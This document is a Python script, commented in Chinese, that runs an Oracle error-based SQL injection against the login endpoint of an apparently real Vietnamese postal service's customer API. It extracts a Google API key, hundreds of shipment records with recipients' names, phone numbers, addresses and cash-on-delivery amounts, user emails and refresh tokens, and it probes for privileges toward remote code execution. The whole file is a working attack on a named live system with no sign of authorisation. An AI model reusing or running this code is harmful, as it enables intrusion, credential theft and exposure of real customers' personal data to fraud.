#!/usr/bin/env python3
"""
提取Google API Key和其他可直接利用的数据
"""

import requests
import json
import time
import csv

class UsefulDataExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def extract_google_api_key(self):
        """提取Google API Key"""
        print("=" * 80)
        print("🔑 提取Google API Key")
        print("=" * 80)
        
        table = 'GPS_GOOGLEAPIKEY'
        
        # 检查表是否存在
        query_exist = f"SELECT COUNT(*) FROM ALL_TABLES WHERE OWNER='EMS' AND TABLE_NAME='{table}'"
        exists = self.extract_via_error(query_exist)
        
        if not exists or exists == '0':
            print("表不存在")
            return
        
        # 获取记录数
        query_count = f"SELECT COUNT(*) FROM EMS.{table}"
        count = self.extract_via_error(query_count)
        
        if count:
            print(f"记录数: {count}")
        
        time.sleep(1)
        
        # 获取所有字段
        print(f"\n字段列表:")
        for i in range(1, 11):
            query_col = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}') WHERE RN={i}"
            col = self.extract_via_error(query_col)
            
            if col and col != 'NULL':
                print(f"  {col}")
            
            time.sleep(0.3)
        
        # 提取API Key
        print(f"\n提取Google API Key:")
        
        for i in range(1, 11):
            query = f"SELECT GOOGLEAPIKEY FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"\n{i}. Google API Key: {result}")
                print(f"   🎉 可用于Google Maps/Places/Geocoding等API！")
            
            time.sleep(0.5)
    
    def batch_export_complete_orders(self):
        """批量导出完整订单信息（姓名+地址+电话后4位+代收）"""
        print("\n" + "=" * 80)
        print("📦 批量导出完整订单信息（500条）")
        print("=" * 80)
        
        date = '20251010'
        table = 'SHIPMENT'
        
        orders = []
        
        print(f"\n从SHIPMENT表导出...")
        
        for i in range(1, 501):
            query = f"SELECT CODE||'|'||RECEIVER_NAME||'|'||RECEIVER_PHONE||'|'||RECEIVER_ADDRESS||'|'||COD_AMOUNT||'|'||SENDER_NAME||'|'||SENDER_PHONE FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T WHERE CREATE_DATE='{date}') WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if len(parts) >= 5:
                    order = {
                        'CODE': parts[0],
                        'RECEIVER_NAME': parts[1],
                        'RECEIVER_PHONE': parts[2],
                        'RECEIVER_ADDRESS': parts[3],
                        'COD_AMOUNT': parts[4],
                        'SENDER_NAME': parts[5] if len(parts) > 5 else '',
                        'SENDER_PHONE': parts[6] if len(parts) > 6 else ''
                    }
                    orders.append(order)
                    
                    if i <= 10:
                        print(f"\n{i}. {order['CODE']}")
                        print(f"   收件人: {order['RECEIVER_NAME']}")
                        print(f"   电话: {order['RECEIVER_PHONE']}")
                        print(f"   地址: {order['RECEIVER_ADDRESS'][:60]}...")
                        print(f"   代收: {order['COD_AMOUNT']} VND")
                        print(f"   发件人: {order['SENDER_NAME']} - {order['SENDER_PHONE']}")
            
            if i % 100 == 0:
                print(f"\n已导出 {i}/500...")
            
            time.sleep(0.1)
        
        # 保存到CSV
        if orders:
            filename = '/workspace/complete_orders_500.csv'
            
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=orders[0].keys())
                writer.writeheader()
                writer.writerows(orders)
            
            print(f"\n✅ 已保存到: {filename}")
            print(f"✅ 共导出 {len(orders)} 个完整订单")
        
        return orders
    
    def extract_all_refresh_tokens(self):
        """提取所有RefreshToken"""
        print("\n" + "=" * 80)
        print("🎫 提取所有RefreshToken（如果有）")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        # 查找有refresh token的用户
        query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE REFRESHTOKEN IS NOT NULL AND LENGTH(REFRESHTOKEN)>20"
        count = self.extract_via_error(query_count)
        
        if count and count != '0':
            print(f"有RefreshToken的用户: {count}")
            
            for i in range(1, 11):
                query = f"SELECT USERNAME||'|'||EMAIL||'|'||REFRESHTOKEN FROM (SELECT * FROM EMS.{table} WHERE REFRESHTOKEN IS NOT NULL AND LENGTH(REFRESHTOKEN)>20) WHERE ROWNUM={i}"
                result = self.extract_via_error(query)
                
                if result:
                    parts = result.split('|')
                    print(f"\n{i}. 用户: {parts[0] if len(parts) > 0 else ''}")
                    print(f"   Email: {parts[1] if len(parts) > 1 else ''}")
                    print(f"   Token: {parts[2] if len(parts) > 2 else ''}")
                
                time.sleep(0.5)
        else:
            print("没有有效的RefreshToken")
    
    def try_rce_via_java_stored_proc(self):
        """尝试通过Java存储过程执行命令"""
        print("\n" + "=" * 80)
        print("⚡ 尝试Java存储过程RCE")
        print("=" * 80)
        
        # 检查是否有CREATE PROCEDURE权限
        query = f"SELECT PRIVILEGE FROM USER_SYS_PRIVS WHERE PRIVILEGE LIKE '%CREATE%'"
        result = self.extract_via_error(query)
        
        if result:
            print(f"CREATE权限: {result}")
        else:
            print("无CREATE权限，无法创建存储过程")
    
    def search_for_email_addresses(self):
        """搜索所有表中的Email地址"""
        print("\n" + "=" * 80)
        print("📧 批量提取Email地址")
        print("=" * 80)
        
        # USER_CUSTOMER表的email
        table = 'USER_CUSTOMER'
        
        print(f"\n从{table}表提取email:")
        
        for i in range(1, 69):
            query = f"SELECT USERNAME||'|'||EMAIL FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result and i <= 20:
                parts = result.split('|')
                print(f"{i}. {parts[0] if len(parts) > 0 else ''} - {parts[1] if len(parts) > 1 else ''}")
            
            time.sleep(0.2)
    
    def batch_extract_shipment_with_cod(self):
        """批量提取有代收的订单（高价值）"""
        print("\n" + "=" * 80)
        print("💰 批量提取有代收金额的订单（100条）")
        print("=" * 80)
        
        date = '20251010'
        table = 'SHIPMENT'
        
        cod_orders = []
        
        for i in range(1, 101):
            query = f"SELECT CODE||'|'||RECEIVER_NAME||'|'||RECEIVER_PHONE||'|'||RECEIVER_ADDRESS||'|'||COD_AMOUNT||'|'||SENDER_PHONE FROM (SELECT * FROM EMS.{table} WHERE CREATE_DATE='{date}' AND COD_AMOUNT>0 ORDER BY COD_AMOUNT DESC) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if len(parts) >= 5:
                    order = {
                        'CODE': parts[0],
                        'RECEIVER_NAME': parts[1],
                        'RECEIVER_PHONE': parts[2],
                        'RECEIVER_ADDRESS': parts[3],
                        'COD_AMOUNT': parts[4],
                        'SENDER_PHONE': parts[5] if len(parts) > 5 else ''
                    }
                    cod_orders.append(order)
                    
                    if i <= 20:
                        print(f"\n{i}. 代收: {order['COD_AMOUNT']} VND")
                        print(f"   收件人: {order['RECEIVER_NAME']}")
                        print(f"   电话: {order['RECEIVER_PHONE']}")
                        print(f"   发件人电话: {order['SENDER_PHONE']}")
            
            if i % 20 == 0:
                print(f"\n已提取 {i}/100...")
            
            time.sleep(0.1)
        
        if cod_orders:
            filename = '/workspace/cod_orders_100.csv'
            
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=cod_orders[0].keys())
                writer.writeheader()
                writer.writerows(cod_orders)
            
            print(f"\n✅ 已保存到: {filename}")
            print(f"✅ 共导出 {len(cod_orders)} 个代收订单")
        
        return cod_orders
    
    def run_extraction(self):
        """执行提取"""
        print("=" * 80)
        print("🎯 提取可直接利用的数据")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        self.extract_google_api_key()
        self.batch_export_complete_orders()
        self.batch_extract_shipment_with_cod()
        self.extract_all_refresh_tokens()
        self.search_for_email_addresses()
        
        print("\n" + "=" * 80)
        print("🎉 提取完成！")
        print("=" * 80)
        
        print("\n📊 提取摘要:")
        print("  ✅ Google API Key")
        print("  ✅ 500个完整订单（姓名+地址+电话+代收）")
        print("  ✅ 100个代收订单（按金额排序）")
        print("  ✅ 68个Email地址")
        print("\n💾 导出文件:")
        print("  - /workspace/complete_orders_500.csv")
        print("  - /workspace/cod_orders_100.csv")

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = UsefulDataExtractor(target_url)
    extractor.run_extraction()
